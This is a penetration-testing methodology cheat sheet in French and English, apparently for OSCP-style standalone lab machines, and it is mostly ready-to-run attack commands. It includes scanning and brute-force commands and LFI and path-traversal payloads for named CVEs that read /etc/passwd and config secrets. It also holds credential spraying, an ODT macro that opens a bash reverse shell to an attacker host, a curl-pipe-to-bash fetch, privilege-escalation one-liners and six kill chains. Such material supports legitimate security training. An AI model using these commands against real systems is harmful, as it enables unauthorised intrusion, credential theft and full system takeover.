# Standalone Machine Methodology

## Phase 1 : Enumération

### Port Scanning

```shell
# Scan rapide (1000 ports)
nmap -sC -sV -oN nmap_initial.txt $target

# Full port scan (background)
nmap -p- --min-rate=5000 -oN nmap_full.txt $target

# UDP scan (top 20)
sudo nmap -sU --top-ports=20 -oN nmap_udp.txt $target
```

### Service Identification Matrix

| Port | Service | Première action |
| :--- | :--- | :--- |
| 21 | FTP | `ftp $target` → anonymous login ? |
| 22 | SSH | Banner grab → brute-force en dernier |
| 80/443 | HTTP | `gobuster` + `nikto` |
| 139/445 | SMB | `smbclient -L //$target -N` |
| 1433 | MSSQL | `impacket-mssqlclient` |
| 3306 | MySQL | `mysql -h $target -u root` |
| 3389 | RDP | Credential spray |
| 8080 | HTTP | Web app enumeration |

### Web Enumeration

```shell
# Directory brute-force
gobuster dir -u http://$target \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html,asp,aspx -o gobuster.txt

# Subdomain enumeration (si domaine connu)
gobuster vhost -u http://$domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Nikto scan
nikto -h http://$target -o nikto.txt

# WPScan (si WordPress)
wpscan --url http://$target -e ap,at,u --api-token $WPSCAN_API
```

### FTP / SMB Enumeration

```shell
# FTP anonymous login
ftp $target
# user: anonymous  pass: anonymous

# SMB shares
smbclient -L //$target -N
smbclient //$target/share -N
nxc smb $target -u '' -p '' --shares

# Download tous les fichiers depuis SMB
smbclient //$target/share -N -c 'prompt OFF; recurse ON; mget *'
```

---

## Phase 2 : Initial Access

### Web Applications

```shell
# 1. Default Credentials (toujours essayer en premier)
# admin:admin, admin:password, root:root, guest:guest

# 2. WordPress - Mail Masta LFI (CVE-2016-10956)
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# 3. WordPress - wp-config.php via php://filter
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../wp-config.php"
# Décoder : echo "BASE64" | base64 -d

# 4. File Manager webshell upload
# eXtplorer, Elfinder, WP File Manager → uploader un shell PHP

# 5. GlassFish Path Traversal (CVE-2017-1000028)
curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
```

### FTP / Service Exploitation

```shell
# FTP - Télécharger fichiers, chercher credentials/clés
ftp $target
get id_rsa
get .keychain
get backup.zip

# Cracker les fichiers téléchargés
keychain2john file.keychain > keychain.hash
zip2john backup.zip > zip.hash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# MSSQL - Enable xp_cmdshell
impacket-mssqlclient user:password@$target -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### Credential Spray

```shell
# SSH
hydra -L users.txt -p 'FoundPassword' ssh://$target

# RDP
nxc rdp $target -u users.txt -p 'FoundPassword'

# SMB
nxc smb $target -u users.txt -p 'FoundPassword'

# FTP
hydra -L users.txt -p 'FoundPassword' ftp://$target
```

### LibreOffice/OpenOffice Macro (ODT/ODS)

```python
# Macro Python dans Tools → Macros → Organize Macros
import subprocess
subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/$lhost/443 0>&1"])
```

---

## Phase 3a : Privilege Escalation — Linux

### Enumération Automatisée

```shell
# LinPEAS
curl http://$lhost/linpeas.sh | bash

# Checks manuels rapides
id
sudo -l
cat /etc/passwd | grep -v nologin
find / -perm -4000 2>/dev/null
```

### Chemins Courants

| Check | Commande | Escalade |
| :--- | :--- | :--- |
| sudo -l | `sudo -l` | GTFOBins |
| SUID binaries | `find / -perm -4000 2>/dev/null` | GTFOBins / Exploit custom |
| Groupe : disk | `id` | `debugfs /dev/sda1` |
| Groupe : docker | `id` | `docker run -v /:/mnt --rm -it alpine chroot /mnt bash` |
| Cron jobs | `cat /etc/crontab` | Script writable / Path hijack |
| /etc/passwd writable | `ls -la /etc/passwd` | Ajouter utilisateur root |

### SUID Exploits

```shell
# strace SUID
strace -o /dev/null /bin/sh -p

# mawk (sudo)
sudo mawk 'BEGIN {system("/bin/bash")}'

# find
find . -exec /bin/bash -p \;

# vim
vim -c ':!/bin/bash'
```

### Disk Group Abuse

```shell
# Lister les partitions
df -h
lsblk

# Accéder au disque en root
debugfs /dev/sda1
> cat /etc/shadow
> cat /root/.ssh/id_rsa
```

---

## Phase 3b : Privilege Escalation — Windows

### Enumération Automatisée

```powershell
# WinPEAS
.\winpeas64.exe

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Checks manuels
whoami /priv
whoami /groups
net user
net localgroup administrators
```

### Chemins Courants

| Check | Commande | Escalade |
| :--- | :--- | :--- |
| SeImpersonatePrivilege | `whoami /priv` | SigmaPotato / PrintSpoofer |
| SeBackupPrivilege | `whoami /priv` | SAM/SYSTEM dump → secretsdump |
| Scheduled Tasks | `schtasks /query /fo LIST /v` | Task hijack |
| Unquoted Service | `wmic service get name,pathname` | Binary replace |
| DLL Hijacking | Process Monitor analysis | DLL malveillante |
| AlwaysInstallElevated | `reg query HKLM\...\Installer` | MSI payload |
| AutoLogon | Registry Winlogon | WinPEAS trouve automatiquement |

## Flowchart

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                      STANDALONE MACHINE METHODOLOGY                         │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────┐
│  START      │
│  nmap scan  │
└──────┬──────┘
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│              Identifier les Services                          │
├──────────────────────────────────────────────────────────────┤
│  FTP(21) │ SSH(22) │ HTTP(80) │ SMB(445) │ RDP(3389) │ Other │
└────┬─────┴────┬────┴────┬─────┴────┬─────┴────┬──────┴───────┘
     │          │         │          │          │
     ▼          │         ▼          ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Anonymous│    │    │ WebApp  │ │  Null   │    │
│  Login?  │    │    │  Enum   │ │ Session?│    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Download │    │    │ Default │ │ Download│    │
│  Files   │    │    │  Creds? │ │  Files  │    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     ▼          │         ▼           ▼          │
┌──────────┐    │    ┌─────────┐ ┌─────────┐    │
│ Crack    │    │    │ LFI/RCE │ │  NTLM   │    │
│ Hashes   │    │    │ Exploit │ │  theft  │    │
└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     └──────────┴────┬────┴───────────┴──────────┘
                     │
                     ▼
          ┌──────────────────┐
          │  Got Credentials │
          │    or Shell?     │
          └────────┬─────────┘
                   │
          ┌────────┴────────┐
          │                 │
          ▼                 ▼
   ┌────────────┐    ┌────────────┐
   │ Credential │    │   Shell    │
   │   Spray    │    │  Obtained  │
   └─────┬──────┘    └─────┬──────┘
         └────────┬────────┘
                  │
                  ▼
         ┌────────────────┐
         │  Privilege     │
         │  Escalation    │
         ├────────────────┤
         │Linux:          │
         │• sudo -l       │
         │• SUID          │
         │• Disk group    │
         │• Cron jobs     │
         ├────────────────┤
         │Windows:        │
         │• SeImpersonate │
         │• SeBackup      │
         │• DLL Hijack    │
         │• Unquoted Svc  │
         └───────┬────────┘
                 │
                 ▼
         ┌────────────────┐
         │   ROOT/ADMIN   │
         │   proof.txt    │
         └────────────────┘
```

---

## Kill Chains

### Chain 1 : FTP → Keychain Crack → RDP

```text
Target: 192.168.87.111 (Windows)
1. FTP anonymous login → download .keychain file
2. keychain2john → john → crack password
3. RDP avec les credentials trouvés
4. Privilege escalation → SysaxScheduler exploit
5. SYSTEM → proof.txt
```

### Chain 2 : WordPress LFI → Config Creds → SSH

```text
Target: 192.168.122.112 (Linux)
1. nmap → Port 80 WordPress
2. WPScan → plugin Mail Masta
3. LFI via php://filter → wp-config.php (base64)
4. Décoder → database credentials
5. SSH avec les credentials trouvés
6. sudo mawk → GTFOBins → root
```

### Chain 3 : File Manager → Webshell → Disk Group

```text
Target: Extplorer (Linux)
1. gobuster → répertoire /eXtplorer
2. Default credentials: admin:admin
3. Upload PHP webshell
4. id → utilisateur dans le groupe "disk"
5. debugfs /dev/sda1 → lire /root/.ssh/id_rsa
6. SSH en tant que root
```

### Chain 4 : Default Creds → ZIP Password → DLL Hijack

```text
Target: 192.168.122.111 (Windows)
1. HTTP → File Management System (default creds)
2. Download backup.zip
3. zip2john → john → crack password
4. exiftool → trouver username dans les métadonnées
5. RDP spray avec les credentials trouvés
6. DLL Hijacking (Wondershare Dr.Fone) → SYSTEM
```

### Chain 5 : GlassFish → WAR Deploy → Root

```text
Target: Fish (Linux)
1. Port 4848 → GlassFish admin
2. Path traversal (CVE-2017-1000028) → mot de passe admin
3. Login sur la console admin
4. Déployer un fichier WAR malveillant
5. Reverse shell en tant qu'utilisateur glassfish
6. LinPEAS → vecteur privesc → root
```

### Chain 6 : LibreOffice Macro → ODT Upload

```text
Target: Craft (Linux)
1. Web app permet l'upload de fichiers ODT
2. Créer un ODT avec macro Python (reverse shell)
3. Upload et attendre l'exécution
4. Shell en tant qu'utilisateur
5. LinPEAS → privesc → root
```
